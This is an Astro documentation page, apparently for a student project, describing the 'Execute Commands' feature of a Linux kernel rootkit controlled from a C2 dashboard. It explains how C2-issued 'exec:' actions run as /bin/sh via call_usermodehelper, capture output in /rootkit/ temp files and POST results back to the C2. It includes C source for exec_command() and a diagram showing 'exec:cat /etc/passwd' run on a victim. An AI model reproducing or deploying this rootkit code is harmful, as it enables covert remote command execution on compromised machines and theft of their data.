---
import FeaturePage from '../../layouts/FeaturePage.astro';
---

<FeaturePage
  title="Execute Commands"
  description="Run arbitrary shell commands on the victim from the C2 dashboard. stdout, stderr and exit code are returned."
  badge="Mandatory"
  points="5 pts"
  slug="exec"
  prev={{ href: "/features/connection", label: "Connection & Polling" }}
  next={{ href: "/features/upload-download", label: "Upload / Download" }}
>

<section class="section">
  <h2 class="section-title">// How it works</h2>
  <div class="prose">
    <p>
      When the C2 sends an <code>exec:&lt;cmd&gt;</code> action, the rootkit calls <code>exec_command()</code>
      which uses <code>call_usermodehelper()</code>, the kernel API for spawning userland processes from
      kernel context. The command is wrapped in a shell one-liner that redirects output to temporary files
      in <code>/rootkit/</code>, since kernel threads have no access to stdio.
    </p>
    <p>
      After the shell exits (<code>UMH_WAIT_PROC</code>), the rootkit reads back stdout, stderr and the
      exit code from the temp files, then POSTs all three to <code>/api/&lt;uuid&gt;/result</code>.
    </p>
  </div>
</section>

<section class="section">
  <h2 class="section-title">// Flow diagram</h2>
  <div class="diagram">
    <svg viewBox="0 0 680 300" xmlns="http://www.w3.org/2000/svg" font-family="'Courier New',monospace">
      <defs>
        <marker id="a" markerWidth="8" markerHeight="8" refX="6" refY="3" orient="auto"><path d="M0,0 L0,6 L8,3 z" fill="#00ff41"/></marker>
        <marker id="ay" markerWidth="8" markerHeight="8" refX="6" refY="3" orient="auto"><path d="M0,0 L0,6 L8,3 z" fill="#e3b341"/></marker>
      </defs>
      <!-- participants -->
      <text x="80"  y="25" text-anchor="middle" fill="#e6edf3" font-size="12" font-weight="bold">C2 Server</text>
      <text x="310" y="25" text-anchor="middle" fill="#e6edf3" font-size="12" font-weight="bold">Rootkit</text>
      <text x="560" y="25" text-anchor="middle" fill="#e6edf3" font-size="12" font-weight="bold">/bin/sh</text>
      <line x1="80"  y1="32" x2="80"  y2="295" stroke="#30363d" stroke-width="1.5" stroke-dasharray="4,3"/>
      <line x1="310" y1="32" x2="310" y2="295" stroke="#30363d" stroke-width="1.5" stroke-dasharray="4,3"/>
      <line x1="560" y1="32" x2="560" y2="295" stroke="#30363d" stroke-width="1.5" stroke-dasharray="4,3"/>

      <!-- poll → action -->
      <line x1="80"  y1="58" x2="295" y2="58" stroke="#e3b341" stroke-width="1.5" marker-end="url(#ay)"/>
      <text x="190" y="51" text-anchor="middle" fill="#8b949e" font-size="10">200 : exec:cat /etc/passwd</text>

      <!-- build sh cmd -->
      <rect x="230" y="68" width="160" height="22" rx="3" fill="#161b22" stroke="#30363d" stroke-width="1"/>
      <text x="310" y="83" text-anchor="middle" fill="#8b949e" font-size="10">build: cmd &gt;stdout 2&gt;stderr; echo $? &gt;exitcode</text>

      <!-- call_usermodehelper -->
      <line x1="310" y1="103" x2="545" y2="103" stroke="#00ff41" stroke-width="1.5" marker-end="url(#a)"/>
      <text x="430" y="96" text-anchor="middle" fill="#8b949e" font-size="10">call_usermodehelper("/bin/sh", UMH_WAIT_PROC)</text>

      <!-- sh runs -->
      <rect x="490" y="110" width="140" height="22" rx="3" fill="#161b22" stroke="#00ff41" stroke-width="1" stroke-opacity="0.4"/>
      <text x="560" y="125" text-anchor="middle" fill="#8b949e" font-size="10">executes command...</text>

      <!-- writes files -->
      <rect x="490" y="138" width="140" height="22" rx="3" fill="#161b22" stroke="#30363d" stroke-width="1"/>
      <text x="560" y="153" text-anchor="middle" fill="#8b949e" font-size="10">writes /rootkit/&#123;stdout,stderr,exitcode&#125;</text>

      <!-- sh exits -->
      <line x1="560" y1="173" x2="325" y2="173" stroke="#e3b341" stroke-width="1.5" stroke-dasharray="3,3" marker-end="url(#ay)"/>
      <text x="440" y="167" text-anchor="middle" fill="#8b949e" font-size="10">process exits → WAIT_PROC returns</text>

      <!-- read files -->
      <rect x="230" y="180" width="160" height="22" rx="3" fill="#161b22" stroke="#30363d" stroke-width="1"/>
      <text x="310" y="195" text-anchor="middle" fill="#8b949e" font-size="10">read_file(stdout), stderr, exitcode</text>

      <!-- POST result -->
      <line x1="310" y1="218" x2="95" y2="218" stroke="#00ff41" stroke-width="1.5" marker-end="url(#a)"/>
      <text x="205" y="211" text-anchor="middle" fill="#8b949e" font-size="10">POST /api/&lt;uuid&gt;/result</text>
      <text x="205" y="226" text-anchor="middle" fill="#8b949e" font-size="9">exit_code=0&stdout=...&stderr=...</text>

      <!-- dashboard -->
      <rect x="20" y="236" width="120" height="22" rx="3" fill="#161b22" stroke="#00ff41" stroke-width="1" stroke-opacity="0.4"/>
      <text x="80" y="251" text-anchor="middle" fill="#8b949e" font-size="10">shown in dashboard</text>
    </svg>
  </div>
</section>

<section class="section">
  <h2 class="section-title">// Implementation</h2>
  <div class="code-block">
    <div class="code-header"><span>rootkit/src/exec.c : exec_command()</span><span class="lang">C</span></div>
    <pre><code>{`int exec_command(const char *cmd, char *stdout_buf, ..., int *exit_code)
{
    // Build: cmd >stdout 2>stderr; echo $? >exitcode
    snprintf(sh_cmd, 4096,
             "%s > /rootkit/stdout 2> /rootkit/stderr"
             " ; echo $? > /rootkit/exitcode", cmd);

    char *argv[] = { "/bin/sh", "-c", sh_cmd, NULL };
    char *envp[] = { "HOME=/",
                     "PATH=/sbin:/bin:/usr/sbin:/usr/bin", NULL };

    sub_info = call_usermodehelper_setup(argv[0], argv, envp,
                                         GFP_KERNEL, NULL, NULL, NULL);

    // UMH_WAIT_PROC: block the kthread until /bin/sh exits
    call_usermodehelper_exec(sub_info, UMH_WAIT_PROC);

    // Read results back from temp files
    read_file("/rootkit/exitcode", exitcode_buf, sizeof(exitcode_buf));
    *exit_code = simple_strtol(exitcode_buf, NULL, 10);
    read_file("/rootkit/stdout",   stdout_buf, stdout_max);
    read_file("/rootkit/stderr",   stderr_buf, stderr_max);
}`}</code></pre>
  </div>
  <div class="callout">
    <span class="callout-icon">💡</span>
    <p><strong>Why temp files?</strong> Kernel threads have no file descriptors and no access to stdio. <code>call_usermodehelper()</code> runs the process without any attached terminal. Redirecting through files in <code>/rootkit/</code> is the standard pattern for capturing subprocess output from kernel space.</p>
  </div>
</section>

<section class="section">
  <h2 class="section-title">// Key details</h2>
  <div class="kv-grid">
    <div class="kv-item"><span class="kv-key">Kernel API</span><code>call_usermodehelper()</code></div>
    <div class="kv-item"><span class="kv-key">Shell</span><code>/bin/sh -c &lt;cmd&gt;</code></div>
    <div class="kv-item"><span class="kv-key">Wait mode</span><code>UMH_WAIT_PROC</code></div>
    <div class="kv-item"><span class="kv-key">stdout buffer</span><code>4096 bytes</code></div>
    <div class="kv-item"><span class="kv-key">stderr buffer</span><code>1024 bytes</code></div>
    <div class="kv-item"><span class="kv-key">Result route</span><code>POST /api/&lt;uuid&gt;/result</code></div>
  </div>
</section>

</FeaturePage>
